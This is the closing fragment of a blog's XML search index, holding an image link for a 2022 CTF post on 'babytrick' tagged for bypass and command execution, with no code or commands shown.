<p><img src="/2022/04/16/%E7%AB%9E%E8%B5%9B%E8%AF%BE-babytrick/3.png" alt="img"></p>
]]></content>
      <categories>
        <category>实践</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>绕过</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
</search>
